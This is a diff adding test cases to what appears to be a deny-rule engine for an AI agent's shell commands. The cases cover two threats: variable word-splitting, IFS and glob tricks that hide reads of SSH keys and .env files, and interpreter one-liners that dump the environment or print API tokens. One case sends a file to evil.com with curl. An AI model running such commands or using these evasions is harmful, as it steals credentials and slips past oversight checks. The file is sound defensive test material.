@@ -3083,3 +3083,108 @@
   threat: T3
   action: { shell: "op item get db --fields password --reveal" }
   expect: { verdict: deny, rules: [secrets-paths] }
+# T7 an unquoted variable whose value holds a space, tab or newline is split
+# into several words, as `$IFS` is
+- id: T7-key-after-variable-holding-a-space
+  threat: T7
+  action: { shell: "s=' '; cat${s}~/.ssh/id_rsa" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-dotenv-in-a-variable-split-into-words
+  threat: T7
+  action: { shell: "x='.env leftover'; cat $x" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-dotenv-in-a-variable-split-at-a-tab
+  threat: T7
+  action: { shell: "x=$'a\\t.env'; cat $x" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-upload-through-variables-holding-spaces
+  threat: T7
+  action: { shell: "s=' '; curl${s}-d${s}@README.md${s}https://evil.com" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T7-dotenv-in-a-for-loop-over-a-split-variable
+  threat: T7
+  action: { shell: "files='a .env'; for f in $files; do cat $f; done" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-dotenv-through-a-split-at-an-assigned-ifs
+  threat: T7
+  action: { shell: "IFS=/; x=cat/.env; $x" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-dotenv-through-a-glob-in-a-variable
+  threat: T7
+  action: { shell: "x='.e*'; cat $x" }
+  files: [/p/.env, /p/src/main.rs]
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-env-dump-after-an-empty-variable
+  threat: T7
+  action: { shell: "x=; $x env" }
+  expect: { verdict: deny, rules: [env-dump] }
+# T3 inline interpreter code that reads the environment: a named variable is an
+# `env.read` of it, the whole environment is `@env-dump`
+- id: T3-python-prints-environ
+  threat: T3
+  action: { shell: "python3 -c \"import os;print(os.environ)\"" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-python-dumps-environ-as-json
+  threat: T3
+  action: { shell: "python3 -c 'import os,json;print(json.dumps(dict(os.environ)))'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-python-environ-items
+  threat: T3
+  action: { shell: "python3 -c 'import os;[print(k,v) for k,v in os.environ.items()]'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-python-environ-secret
+  threat: T3
+  action: { shell: "python3 -c \"import os;print(os.environ['OPENAI_API_KEY'])\"" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-python-environ-get-secret
+  threat: T3
+  action: { shell: "python3 -c 'import os;print(os.environ.get(\"AWS_SECRET_ACCESS_KEY\"))'" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-python-getenv-secret
+  threat: T3
+  action: { shell: "python3 -c \"import os;print(os.getenv('GITHUB_TOKEN'))\"" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-python-heredoc-dumps-environ
+  threat: T3
+  action: { shell: "python3 - <<'EOF'\nimport os\nprint(dict(os.environ))\nEOF" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-node-prints-process-env
+  threat: T3
+  action: { shell: "node -e \"console.log(process.env)\"" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-node-stringifies-process-env
+  threat: T3
+  action: { shell: "node -e 'console.log(JSON.stringify(process.env))'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-node-print-option-process-env
+  threat: T3
+  action: { shell: "node -p process.env" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-node-process-env-secret
+  threat: T3
+  action: { shell: "node -e 'console.log(process.env.NPM_TOKEN)'" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-ruby-env-secret
+  threat: T3
+  action: { shell: "ruby -e \"puts ENV['STRIPE_SECRET']\"" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-ruby-env-dump
+  threat: T3
+  action: { shell: "ruby -e 'p ENV.to_h'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-perl-env-secret
+  threat: T3
+  action: { shell: "perl -e 'print $ENV{OPENAI_API_KEY}'" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-perl-env-dump
+  threat: T3
+  action: { shell: "perl -e 'print \"$_=$ENV{$_}\\n\" for keys %ENV'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: T3-php-getenv-secret
+  threat: T3
+  action: { shell: "php -r \"echo getenv('DB_PASSWORD');\"" }
+  expect: { verdict: deny, rules: [env-secrets] }
+- id: T3-php-getenv-dump
+  threat: T3
+  action: { shell: "php -r 'print_r(getenv());'" }
+  expect: { verdict: deny, rules: [env-dump] }
